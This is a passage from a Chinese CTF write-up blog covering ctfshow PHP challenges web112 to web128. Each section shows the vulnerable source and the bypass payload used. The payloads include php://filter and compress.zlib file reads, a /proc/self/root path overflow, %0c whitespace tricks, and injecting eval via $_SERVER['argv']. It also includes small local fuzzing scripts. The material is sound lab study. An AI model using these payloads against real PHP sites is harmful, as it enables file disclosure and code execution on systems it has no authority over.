class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以直接读文件<code>?file=php://filter/resource=flag.php</code><br>除此之外，还有几种特殊的编码方式<br><code>file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</code>（这个之前没见过，注意一下）<br><code>file=compress.zlib://flag.php</code><br><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</code></p><h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><blockquote><p><a href="https://www.cnblogs.com/meng-han/p/16803560.html#:~:text=ctfshow%20web112%20%28%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87is_file%E5%87%BD%E6%95%B0%29%20%24file%20%3D%20%24_GET%20%5B%20%27file%27,%7D%20else%20%7B%20echo%20%22hacker%21%22%20%3B%20%7D%20%E8%BF%99%E9%87%8C%E7%9A%84is_file%E5%87%BD%E6%95%B0%EF%BC%8C%E5%9C%A8%E4%BD%BF%E7%94%A8php%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%97%B6%E5%80%99%E4%BC%9A%E8%BF%94%E5%9B%9Efalse%EF%BC%8C%E9%99%A4%E4%BA%86file%3A%2F%2F%E5%8D%8F%E8%AE%AE%E4%BB%A5%E5%A4%96%E3%80%82">https://www.cnblogs.com/meng-han/p/16803560.html#:~:text=ctfshow%20web112%20%28%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87is_file%E5%87%BD%E6%95%B0%29%20%24file%20%3D%20%24_GET%20%5B%20%27file%27,%7D%20else%20%7B%20echo%20%22hacker%21%22%20%3B%20%7D%20%E8%BF%99%E9%87%8C%E7%9A%84is_file%E5%87%BD%E6%95%B0%EF%BC%8C%E5%9C%A8%E4%BD%BF%E7%94%A8php%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%97%B6%E5%80%99%E4%BC%9A%E8%BF%94%E5%9B%9Efalse%EF%BC%8C%E9%99%A4%E4%BA%86file%3A%2F%2F%E5%8D%8F%E8%AE%AE%E4%BB%A5%E5%A4%96%E3%80%82</a></p></blockquote><h3 id="考点：目录溢出"><a href="#考点：目录溢出" class="headerlink" title="考点：目录溢出"></a>考点：目录溢出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">function <span class="built_in">filter</span>($file)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        die(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(<span class="built_in">filter</span>($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?file=compress.zlib://flag.php</code><br>除此之外，有个预期解：<code>?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code><br>在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容。<br>原理：is_file函数能处理的长度有限,用/proc/self/root可以目录溢出</p><h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function <span class="built_in">filter</span>($file)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        die(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">echo <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(<span class="built_in">filter</span>($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&quot;hacker!&quot;</span>;</span><br></pre></td></tr></table></figure><p>这个直接使用<code>?file=php://filter/resource=flag.php</code>就行</p><h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><h3 id="考点：trim函数的绕过-is-numeric绕过"><a href="#考点：trim函数的绕过-is-numeric绕过" class="headerlink" title="考点：trim函数的绕过+is_numeric绕过"></a>考点：trim函数的绕过+is_numeric绕过</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">include(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">function <span class="built_in">filter</span>($num)&#123;</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($num) <span class="keyword">and</span> $num!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim($num)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="built_in">filter</span>($num)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        echo <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="trim函数"><a href="#trim函数" class="headerlink" title="trim函数"></a>trim函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">trim(string,charlist)</span><br><span class="line"></span><br><span class="line">参数        描述</span><br><span class="line">string        必需。规定要检查的字符串。</span><br><span class="line">charlist    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\0&quot;</span>       - NULL</span><br><span class="line"><span class="string">&quot;\t&quot;</span>       - 制表符</span><br><span class="line"><span class="string">&quot;\n&quot;</span>       - 换行</span><br><span class="line"><span class="string">&quot;\x0B&quot;</span>     - 垂直制表符</span><br><span class="line"><span class="string">&quot;\r&quot;</span>       - 回车</span><br><span class="line"><span class="string">&quot; &quot;</span>        - 空格</span><br></pre></td></tr></table></figure><p>测试程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt;=<span class="number">128</span> ; $i++) &#123;</span><br><span class="line">$x=<span class="built_in">chr</span>($i).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(trim($x)!==<span class="string">&#x27;1&#x27;</span> &amp;&amp;  is_numeric($x))&#123;</span><br><span class="line">echo urlencode(<span class="built_in">chr</span>($i)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现除了+-.号以外还有只剩下%0c也就是换页符了，所以这个题只有这一个固定的解了。<br><code>num=%0c36</code></p><h1 id="web123、web125、web126"><a href="#web123、web125、web126" class="headerlink" title="*web123、web125、web126"></a>*web123、web125、web126</h1><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/109181768">https://blog.csdn.net/miuzzx/article/details/109181768</a></p></blockquote><h3 id="考点：php变量不允许出现-传入-代替-SERVER-‘argv’"><a href="#考点：php变量不允许出现-传入-代替-SERVER-‘argv’" class="headerlink" title="考点：php变量不允许出现. 传入[代替_ $_SERVER[‘argv’]"></a>考点：php变量不允许出现. 传入[代替_ $_SERVER[‘argv’]</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;isset($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!isset($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, $c)&amp;&amp;$c&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="built_in">eval</span>(<span class="string">&quot;$c&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>第一个问题是php变量名是不允许点的使用的：<br>比如可以测试一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_POST);</span><br><span class="line"></span><br><span class="line">输入 CTF_SHOW.COM=<span class="number">1</span></span><br><span class="line">返回</span><br><span class="line">array(<span class="number">1</span>) &#123; [<span class="string">&quot;CTF_SHOW_COM&quot;</span>]=&gt; string(<span class="number">1</span>) <span class="string">&quot;1&quot;</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688182650580-e505632b-147a-4bc7-8dbd-d8b01aa593fd.png" alt="image.png"><br>另外有一个知识点，使用<code>[</code>来代替下划线，具体原因未知，爆破脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span>=<span class="string">&quot;http://127.0.0.1/test.php&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;=<span class="number">128</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="string">&quot;CTF&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;SHOW&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>)).<span class="string">&quot;COM&quot;</span>.<span class="string">&quot;=123&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>,<span class="variable">$data</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$data</span>.<span class="string">&quot;\n&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>test.php:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>]))&#123;</span><br><span class="line">    echo <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果<br><code>CTF%5BSHOW.COM=123</code><br>另外</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、cli模式（命令行）下</span><br><span class="line"></span><br><span class="line">第一个参数$_SERVER[<span class="string">&#x27;argv&#x27;</span>][<span class="number">0</span>]是脚本名，其余的是传递给脚本的参数</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、web网页模式下</span><br><span class="line"></span><br><span class="line">在web页模式下必须在php.ini开启register_argc_argv配置项</span><br><span class="line"></span><br><span class="line">    设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果</span><br><span class="line"></span><br><span class="line">    这时候的$_SERVER[‘argv’][<span class="number">0</span>] = $_SERVER[‘QUERY_STRING’]</span><br><span class="line"></span><br><span class="line">    $argv,$argc在web模式下不适用</span><br></pre></td></tr></table></figure><p>因为我们是在网页模式下运行的，所以<code>$_SERVER[&#39;argv&#39;][0] = $_SERVER[&#39;QUERY_STRING&#39;]</code>也就是<code>$a[0]= $_SERVER[&#39;QUERY_STRING&#39;]</code><br>这时候我们只要通过 <code>eval(&quot;$c&quot;.&quot;;&quot;);</code>将$flag赋值<code>flag_give_me</code>就可以了。<br>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">get:  $fl0g=flag_give_me;</span><br><span class="line">post:  CTF_SHOW=<span class="number">1</span>&amp;CTF%5bSHOW.COM=<span class="number">1</span>&amp;fun=<span class="built_in">eval</span>($a[<span class="number">0</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>非预期：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=var_dump($GLOBALS)   题目出不来，本地测试可以</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get: a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">传入 a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">结果如下</span><br><span class="line">array(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; string(<span class="number">3</span>) <span class="string">&quot;a=1&quot;</span> [<span class="number">1</span>]=&gt; string(<span class="number">17</span>) <span class="string">&quot;fl0g=flag_give_me&quot;</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CLI模式下直接把 request info ⾥⾯的argv值复制到arr数组中去</span><br><span class="line">继续判断query string是否为空，</span><br><span class="line">如果不为空把通过+符号分割的字符串转换成php内部的zend_string，</span><br><span class="line">然后再把这个zend_string复制到 arr 数组中去。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$ctf_show = md5($flag);</span><br><span class="line">$url = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line">//特殊字符检测</span><br><span class="line">function waf($url)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">return</span> true;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(waf($url))&#123;</span><br><span class="line">    die(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf_show===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试跑一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">128</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$url</span>=<span class="string">&quot;http://127.0.0.1/flag.php?ctf&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;show=1&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>)!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf_show&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下的这些字符可以代替<code>_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ _ [ .  </span><br><span class="line">+  这里的加号在url中起到空格的作用</span><br></pre></td></tr></table></figure><p>出去过滤掉的字符，可以使用空格实现<br>payload：<code>ctf show=ilove36d</code></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这种题需要有fuzz的技术，得学一下这个php就脚本的写法。</p><h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><h3 id="考点：gettext（”-”）函数的使用-查看所有变量get-defined-vars"><a href="#考点：gettext（”-”）函数的使用-查看所有变量get-defined-vars" class="headerlink" title="考点：gettext（”_”）函数的使用+查看所有变量get_defined_vars"></a>考点：gettext（”_”）函数的使用+查看所有变量get_defined_vars</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>连续两次调用，而且会检查f1函数名称，特殊字符的函数只有<code>_</code>，所对应的函数为：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688274254001-69cdf9cb-1498-4251-9d53-cb854861e579.png" alt="image.png"><br>  <img 